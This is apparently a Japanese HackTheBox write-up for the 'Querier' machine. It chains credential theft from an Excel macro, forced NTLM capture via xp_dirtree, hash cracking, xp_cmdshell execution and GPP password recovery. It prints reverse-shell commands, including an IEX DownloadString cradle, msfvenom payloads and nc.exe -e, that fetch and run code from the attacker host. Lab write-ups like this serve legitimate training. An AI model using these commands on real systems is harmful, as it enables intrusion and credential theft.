---
title: "[Medium] Querier HackTheBox"
emoji: "🗄️"
type: "tech"
topics: ["hackthebox", "pentesting", "mssql", "windows"]
published: true
---

# TL;DR

- SMB共有`Reports`に匿名(null session)でアクセスし、マクロ付きExcelファイルからMSSQLの平文認証情報を回収しました
- Windows認証(NTLM)経由でMSSQLへのログインに成功し、`reporting`ユーザーとしてDB内部を列挙しました
- `xp_dirtree`にUNCパスを渡すことでMSSQLサービスアカウント(`mssql-svc`)にSMB接続を強制させ、NTLMv2ハッシュをキャプチャしました
- キャプチャしたハッシュをrockyou.txtでクラックし、`mssql-svc`の平文パスワードを取得しました
- `mssql-svc`権限で`xp_cmdshell`経由のコマンド実行に成功し、リバースシェルを取得してuserフラグを獲得しました
- Group Policy Preferences(GPP)の`Groups.xml`からAdministratorの認証情報を発見し、rootフラグを取得しました

---

# 🔎 Enumeration

## nmap

nmapによるポートスキャンを実施しました。SMB(445)とMSSQL(1433)が主な攻撃対象で、Webアプリケーションは検出されませんでした。

```
Host: 10.129.27.181  (QUERIER)
OS: Windows Server 2019 Standard (Build 17763), domain member of HTB.LOCAL

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  SMB (SMBv1 disabled, signing enabled but not required, Null Auth: True)
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 (RTM) 14.0.1000.169 (X64)
5985/tcp  open  http          Microsoft HTTPAPI 2.0 (WinRM)
47001/tcp open  http          Microsoft HTTPAPI 2.0 (WinRM)
49664-49671/tcp open msrpc    dynamic RPC ports
```

# ⚒️ Exploit -user flag-

## SMB匿名アクセスから資格情報を窃取

SMB共有を確認すると、`Reports`共有に匿名(null session)でアクセスできました。

```
$ smbclient -U "" -L 10.129.27.181
Password for [WORKGROUP\]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Reports         Disk      
SMB1 disabled -- no workgroup available

$ smbclient.py 10.129.27.181 -no-pass
Impacket v0.14.0.dev0+20260715.13927.137441c1 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use reports
# ls
drw-rw-rw-          0  Mon Jan 28 23:26:31 2019 .
drw-rw-rw-          0  Mon Jan 28 23:26:31 2019 ..
-rw-rw-rw-      12229  Mon Jan 28 23:26:31 2019 Currency Volume Report.xlsm
# get Currency Volume Report.xlsm
```

共有内の`Currency Volume Report.xlsm`(マクロ有効Excel)を回収し、`olevba`でVBAマクロを解析すると、平文のMSSQL接続文字列が見つかりました。

```
$ olevba Currency\ Volume\ Report.xlsm 
olevba 0.60.2 on Python 3.13.13 - http://decalage.info/python/oletools
===============================================================================
FILE: Currency Volume Report.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
 
  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
```

クレデンシャル`reporting` / `PcwTWTHRwryjc$c6`が手に入りました。SQL認証モードではログインが拒否されましたが、Windows認証(NTLM)経由でのMSSQLログインには成功しました。ログインは`QUERIER\reporting`というローカルWindowsアカウントにマッピングされており、同じクレデンシャルは`--local-auth`を付けたSMBローカル認証でも有効でした。一方、ドメイン認証(`HTB.LOCAL\reporting`)は失敗し、WinRMも認証に失敗しました。

```
# ドメインでのNTLM windows認証は失敗する
$ netexec mssql 10.129.27.181 -u reporting -p 'PcwTWTHRwryjc$c6'
MSSQL       10.129.27.181   1433   QUERIER          [*] Windows 10 / Server 2019 Build 17763 (2017 RTM 14.0.1000) (name:QUERIER) (domain:HTB.LOCAL) (EncryptionReq:False) 
MSSQL       10.129.27.181   1433   QUERIER          [-] HTB.LOCAL\reporting:PcwTWTHRwryjc$c6 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
```

```
$ netexec mssql 10.129.27.181 -u reporting -p 'PcwTWTHRwryjc$c6' -d QUERIER

MSSQL       10.129.27.181   1433   QUERIER          [*] Windows 10 / Server 2019 Build 17763 (2017 RTM 14.0.1000) (name:QUERIER) (domain:HTB.LOCAL) (EncryptionReq:False) 
MSSQL       10.129.27.181   1433   QUERIER          [+] QUERIER\reporting:PcwTWTHRwryjc$c6 

$ netexec mssql 10.129.28.70 -u reporting -p 'PcwTWTHRwryjc$c6' -d QUERIER -q "SELECT @@version;"
MSSQL       10.129.28.70    1433   QUERIER          [*] Windows 10 / Server 2019 Build 17763 (2017 RTM 14.0.1000) (name:QUERIER) (domain:HTB.LOCAL) (EncryptionReq:False) 
MSSQL       10.129.28.70    1433   QUERIER          [+] QUERIER\reporting:PcwTWTHRwryjc$c6 
MSSQL       10.129.28.70    1433   QUERIER          Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) 
    Aug 22 2017 17:04:49 
    Copyright (C) 2017 Microsoft Corporation
    Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
```

## MSSQL内部列挙(reporting権限)

`reporting`は`sysadmin`ロールのメンバーではなく、`xp_cmdshell`も無効化されており、有効化権限もEXEC権限もありませんでした。アクセス可能なDBは`master, tempdb, model, msdb, volume`で、`volume`にはテーブルが存在しませんでした。

```
$ netexec mssql 10.129.27.181 -d QUERIER -u reporting -p 'PcwTWTHRwryjc$c6' --database
MSSQL       10.129.27.181   1433   QUERIER          [*] Windows 10 / Server 2019 Build 17763 (2017 RTM 14.0.1000) (name:QUERIER) (domain:HTB.LOCAL) (EncryptionReq:False) 
MSSQL       10.129.27.181   1433   QUERIER          [+] QUERIER\reporting:PcwTWTHRwryjc$c6 
MSSQL       10.129.27.181   1433   QUERIER          [*] Enumerated databases
MSSQL       10.129.27.181   1433   QUERIER          Database Name                  Owner                    
MSSQL       10.129.27.181   1433   QUERIER          ------------------------------ -------------------------
MSSQL       10.129.27.181   1433   QUERIER          master                         sa                       
MSSQL       10.129.27.181   1433   QUERIER          model                          sa                       
MSSQL       10.129.27.181   1433   QUERIER          msdb                           sa                       
MSSQL       10.129.27.181   1433   QUERIER          tempdb                         sa                       
MSSQL       10.129.27.181   1433   QUERIER          volume                         QUERIER\Administrator    
MSSQL       10.129.27.181   1433   QUERIER          Total: 5 database(s)

$ netexec mssql 10.129.27.181 -d QUERIER -u reporting -p 'PcwTWTHRwryjc$c6'  -M mssql_dumper 
MSSQL       10.129.27.181   1433   QUERIER          [*] Windows 10 / Server 2019 Build 17763 (2017 RTM 14.0.1000) (name:QUERIER) (domain:HTB.LOCAL) (EncryptionReq:False) 
MSSQL       10.129.27.181   1433   QUERIER          [+] QUERIER\reporting:PcwTWTHRwryjc$c6 
MSSQL_DU... 10.129.27.181   1433   QUERIER          [*] Searching database: volume
```

DBeaverでもログインに成功しましたが、`volume`データベースにはデータがありませんでした。

![](/images/querier_medium/dbeaver_login.png)

![](/images/querier_medium/volume_db_empty.png)

SMB側も`reporting`で列挙しましたが、目立った差分はありませんでした。

```
$ netexec smb 10.129.27.181 -d QUERIER -u reporting -p 'PcwTWTHRwryjc$c6'  --shares --smb-timeout 10 
SMB         10.129.27.181   445    QUERIER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False) (Null Auth:True)
SMB         10.129.27.181   445    QUERIER          [+] QUERIER\reporting:PcwTWTHRwryjc$c6 
SMB         10.129.27.181   445    QUERIER          [*] Enumerated shares
SMB         10.129.27.181   445    QUERIER          Share           Permissions            Remark
SMB         10.129.27.181   445    QUERIER          -----           -----------            ------
SMB         10.129.27.181   445    QUERIER          ADMIN$                                 Remote Admin
SMB         10.129.27.181   445    QUERIER          C$                                     Default share
SMB         10.129.27.181   445    QUERIER          IPC$            READ                   Remote IPC
SMB         10.129.27.181   445    QUERIER          Reports         READ                   
```

## NTLMハッシュ強制認証(xp_dirtree)

`reporting`権限でも実行可能な拡張ストアドプロシージャ`xp_dirtree`にUNCパスを渡すと、SQL Serverのサービスプロセス(`mssql-svc`)自身が指定先へSMB接続を試み、NTLM認証ハンドシェイクが発生します。攻撃者側でSMBリスナーを立てて待ち構えることで、NTLMv2ハッシュをキャプチャできます。

```bash
# パッシブ(分析)モード = LLMNR/NBT-NS等のポイズニングは行わず、着信SMB認証の記録のみ
sudo python3 /opt/Responder/Responder.py -I <interface> -A -v
```

netexecでSQLクエリを実行します。タイムアウトは長めに設定しました。

```bash
netexec mssql 10.129.28.70 -u reporting -p 'PcwTWTHRwryjc$c6' -d QUERIER --mssql-timeout 30 -q "EXEC master.dbo.xp_dirtree '\\10.10.14.26\dash', 1, 1;"
```

Responderに着信SMBリクエストが記録され、`mssql-svc`のNTLMv2ハッシュがキャプチャできました。

```
[SMB] NTLMv2-SSP Client   : 10.129.28.70
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:d31fa5f31c2bb0ca:6CF982F68C098745CCDB38ED1A503F81:0101000000000000808FC539CE2FDD01BB832B5563EE41CA0000000002000800390048003400430001001E00570049004E002D0036005400490031004E00500034003600550036004A0004003400570049004E002D0036005400490031004E00500034003600550036004A002E0039004800340043002E004C004F00430041004C000300140039004800340043002E004C004F00430041004C000500140039004800340043002E004C004F00430041004C0007000800808FC539CE2FDD0106000400020000000800300030000000000000000000000000300000E0770D5165CA40B9717FA05000DA30C50F369C773518FAB3D0B51165365581420A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003600000000000000000000000000
```

キャプチャしたNTLMv2ハッシュ(`mssql-svc`)をrockyou.txtでクラックしたところ、成功しました。

```
$ hashcat hash.txt /opt/SecLists/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode

MSSQL-SVC::QUERIER:65bd7a003c09e40e:3c2b3652b2fe1dddde6842b1022f9c68:0101000000000000808fc539ce2fdd011e780f3d566ee94e0000000002000800390048003400430001001e00570049004e002d0036005400490031004e00500034003600550036004a0004003400570049004e002d0036005400490031004e00500034003600550036004a002e0039004800340043002e004c004f00430041004c000300140039004800340043002e004c004f00430041004c000500140039004800340043002e004c004f00430041004c0007000800808fc539ce2fdd0106000400020000000800300030000000000000000000000000300000e0770d5165ca40b9717fa05000da30c50f369c773518fab3d0b51165365581420a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003600000000000000000000000000:corporate568
```

## MSSQL経由でRCE(mssql-svc)

取得した認証情報が通るか確認したところ、`mssql-svc`は`sysadmin`相当の権限を持っており、RCEまで確認できました。

```
$ netexec mssql 10.129.28.70 -u mssql-svc -p 'corporate568' -d QUERIER -q "SELECT @@version;"
MSSQL       10.129.28.70    1433   QUERIER          [*] Windows 10 / Server 2019 Build 17763 (2017 RTM 14.0.1000) (name:QUERIER) (domain:HTB.LOCAL) (EncryptionReq:False) 
MSSQL       10.129.28.70    1433   QUERIER          [+] QUERIER\mssql-svc:corporate568 (Pwn3d!)
MSSQL       10.129.28.70    1433   QUERIER          Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) 
    Aug 22 2017 17:04:49 
    Copyright (C) 2017 Microsoft Corporation
    Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)

$ netexec mssql 10.129.28.70 -u mssql-svc -p 'corporate568' -d QUERIER -X 'whoami'
MSSQL       10.129.28.70    1433   QUERIER          [*] Windows 10 / Server 2019 Build 17763 (2017 RTM 14.0.1000) (name:QUERIER) (domain:HTB.LOCAL) (EncryptionReq:False) 
MSSQL       10.129.28.70    1433   QUERIER          [+] QUERIER\mssql-svc:corporate568 (Pwn3d!)
MSSQL       10.129.28.70    1433   QUERIER          [+] Executed command via mssqlexec
MSSQL       10.129.28.70    1433   QUERIER          querier\mssql-svc
```

## リバースシェル取得(mssql-svc)

オンメモリで実行させるため、PowerShellのリバースシェルコードを作成し、Webサーバで待ち受けました。

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.26 LPORT=44444 -f psh -o rev.ps1

$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.129.28.70 - - [19/Aug/2026 12:00:08] "GET /rev.ps1 HTTP/1.1" 200 -
```

netexecでコマンドを実行しますが、`-X`(大文字)オプションでPowerShellを経由させると、AMSIによってブロックされてしまいました。

```
$ netexec mssql 10.129.28.70 -u mssql-svc -p 'corporate568' -d QUERIER -X  "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.26:8888/rev.ps1')" --mssql-timeout 30
MSSQL       10.129.28.70    1433   QUERIER          [+] QUERIER\mssql-svc:corporate568 (Pwn3d!)
MSSQL       10.129.28.70    1433   QUERIER          [+] Executed command via mssqlexec
MSSQL       10.129.28.70    1433   QUERIER          #< CLIXML
MSSQL       10.129.28.70    1433   QUERIER          <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">At line:1 char:1_x000D__x000A_</S><S S="Error">+  IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.26:88 ..._x000D__x000A_</S><S S="Error">+ ~~~~~~~
MSSQL       10.129.28.70    1433   QUERIER          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">This script contains malicious content and has been blocked by your antivirus software._x000D__x000A_</S><S S="Error">    + CategoryInfo          : ParserError: (
MSSQL       10.129.28.70    1433   QUERIER          :) [], ParentContainsErrorRecordException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>
```

exe形式でのダウンロード実行も同様にAVでブロックされました。

```
$ netexec mssql 10.129.28.70 -u mssql-svc -p 'corporate568' -d QUERIER -X "(New-Object Net.WebClient).DownloadFile('http://10.10.14.26:8888/rev.exe','C:\Users\Public\rev.exe')" --mssql-timeout 30 
MSSQL       10.129.28.70    1433   QUERIER          [+] QUERIER\mssql-svc:corporate568 (Pwn3d!)
MSSQL       10.129.28.70    1433   QUERIER          [+] Executed command via mssqlexec
MSSQL       10.129.28.70    1433   QUERIER          #< CLIXML
MSSQL       10.129.28.70    1433   QUERIER          <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">This script contains malicious content and has been blocked by your antivirus software._x000D__x000A_</S></Objs>
```

そこでnetexecの実行オプションを`-X`(PowerShell経由)から`-x`(cmd.exe直接実行)に切り替え、`copy`コマンドでnc.exeを転送してみました。

```
$ netexec mssql 10.129.28.70 -u mssql-svc -p 'corporate568' -d QUERIER -x 'copy \\10.10.14.26\SHARE\nc.exe C:\Users\Public\nc.exe' --mssql-timeout 30 
MSSQL       10.129.28.70    1433   QUERIER          [+] QUERIER\mssql-svc:corporate568 (Pwn3d!)
MSSQL       10.129.28.70    1433   QUERIER          [+] Executed command via mssqlexec
MSSQL       10.129.28.70    1433   QUERIER          1 file(s) copied.

$ netexec mssql 10.129.28.70 -u mssql-svc -p 'corporate568' -d QUERIER -x 'C:\Users\Public\nc.exe　10.10.14.26 5555 -e sh' --mssql-timeout 30 
MSSQL       10.129.28.70    1433   QUERIER          [+] QUERIER\mssql-svc:corporate568 (Pwn3d!)
MSSQL       10.129.28.70    1433   QUERIER          [+] Executed command via mssqlexec
```

リバースシェルの接続自体は届きましたが、コマンドは実行できませんでした。

```
$ nc -lnvp 5555
Listening on 0.0.0.0 5555
Connection received on 10.129.28.70 49687
whoami

```

msfvenomで生成したexeを同じ手順(`copy`→実行、`-x`小文字)で転送・実行したところ、今度はMeterpreterのリバースシェルが取得できました。

```
$ netexec mssql 10.129.28.70 -u mssql-svc -p 'corporate568' -d QUERIER -x 'copy \\10.10.14.26\SHARE\rev.exe C:\Users\Public\rev.exe' --mssql-timeout 30 
MSSQL       10.129.28.70    1433   QUERIER          [+] QUERIER\mssql-svc:corporate568 (Pwn3d!)
MSSQL       10.129.28.70    1433   QUERIER          [+] Executed command via mssqlexec
MSSQL       10.129.28.70    1433   QUERIER          1 file(s) copied.

$ netexec mssql 10.129.28.70 -u mssql-svc -p 'corporate568' -d QUERIER -x 'C:\Users\Public\rev.exe' --mssql-timeout 30 
MSSQL       10.129.28.70    1433   QUERIER          [+] QUERIER\mssql-svc:corporate568 (Pwn3d!)
[12:51:44] ERROR    Error when attempting to execute command via xp_cmdshell: timed out                                                         mssqlexec.py:30
[12:52:14] ERROR    [OPSEC] Error when attempting to restore option 'xp_cmdshell': timed out                                                    mssqlexec.py:47
[12:52:44] ERROR    [OPSEC] Error when attempting to restore option 'advanced options': timed out                                               mssqlexec.py:47
MSSQL       10.129.28.70    1433   QUERIER          [+] Executed command via mssqlexec
```

```
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.26:44444 
[*] Sending stage (255676 bytes) to 10.129.28.70
[*] Meterpreter session 1 opened (10.10.14.26:44444 -> 10.129.28.70:49689) at 2026-08-19 12:51:37 +0900
```

`-X`(大文字)は内部で`create_ps_command()`が呼ばれ、コマンドが`powershell -enc <base64>`にラップされてしまうため、AMSIのスキャン対象になったのが原因と推測されます。`-x`(小文字)であれば`xp_cmdshell`にコマンドがそのまま渡り、cmd.exeが直接実行されるためPowerShell/AMSIを一切介しません。

Meterpreterセッションでuserフラグを取得しました。

```
meterpreter > dir
Listing: C:\Users\mssql-svc\Desktop
===================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-01-29 08:42:03 +0900  desktop.ini
100444/r--r--r--  34    fil   2026-08-19 10:02:49 +0900  user.txt

meterpreter > cat user.txt
383ac7a**************************
```

# 🔎 Enumeration (Internal)

## winPEAS

winPEASを実行したところ、グループポリシー環境設定(GPP)の`Groups.xml`にAdministratorのパスワードらしき情報が残っていました。

```
C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml

C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
    Found C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
    UserName: Administrator
    NewName: [BLANK]
    cPassword: MyUnclesAreMarioAndLuigi!!1!
    Changed: 2019-01-28 23:12:48
    Found C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
    UserName: Administrator
    NewName: [BLANK]
    cPassword: MyUnclesAreMarioAndLuigi!!1!
    Changed: 2019-01-28 23:12:48
```

GPPのcPasswordはAESの公開鍵で暗号化されているだけのため、winPEASが自動的に復号して平文パスワードを表示してくれます。

# 👻 Exploit -root flag-

## GPPパスワードでAdministratorに昇格

取得したAdministratorのパスワードでSMB・WinRMともに認証が通りました。

```
$ netexec smb 10.129.28.70 -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!' -d QUERIER 
SMB         10.129.28.70    445    QUERIER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False) (Null Auth:True)
SMB         10.129.28.70    445    QUERIER          [-] Error checking if user is admin on 10.129.28.70: The NETBIOS connection with the remote host timed out.
SMB         10.129.28.70    445    QUERIER          [+] QUERIER\Administrator:MyUnclesAreMarioAndLuigi!!1! 

$ netexec winrm 10.129.28.70 -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!' -d QUERIER 
WINRM       10.129.28.70    5985   QUERIER          [*] Windows 10 / Server 2019 Build 17763 (name:QUERIER) (domain:HTB.LOCAL) 
WINRM       10.129.28.70    5985   QUERIER          [+] QUERIER\Administrator:MyUnclesAreMarioAndLuigi!!1! (Pwn3d!)
```

evil-winrmで接続し、rootフラグを取得しました。

```
$ ./evil-winrm.rb -i 10.129.28.70 -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!'

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
querier\administrator

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
e5dd8****************
```

# Secret

evil-winrmでの正規ルートの他に、Meterpreter側で`getsystem`を試したところ、Named Pipe Impersonation(PrintSpooler variant)でSYSTEM権限が取得できてしまいました。想定解ではなさそうですが、意図しない経路としてメモしておきます。

```
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```
